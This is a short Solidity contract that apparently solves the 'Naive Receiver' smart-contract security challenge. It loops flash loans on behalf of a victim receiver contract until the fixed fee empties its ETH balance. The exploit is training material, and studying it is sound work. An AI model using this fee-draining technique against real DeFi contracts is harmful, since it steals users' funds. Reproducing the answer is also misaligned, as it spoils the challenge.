// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";

contract FlashLoanReceiverAttacker {
    NaiveReceiverLenderPool pool;
    IERC3156FlashBorrower receiver;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _pool, address _receiver) {
        pool = NaiveReceiverLenderPool(payable(_pool));
        receiver = IERC3156FlashBorrower(_receiver);
    }

    function attack() external {
        // pool.flashLoan(receiver, ETH, 0, "");

        uint256 flashFee = 1 ether;
        while (true) {
            uint256 flashAmount = address(receiver).balance - flashFee;
            pool.flashLoan(receiver, ETH, flashAmount, "");

            // we have consumed all the ETH from the poor receiver :(
            if (address(receiver).balance == 0) break;
        }
    }
}
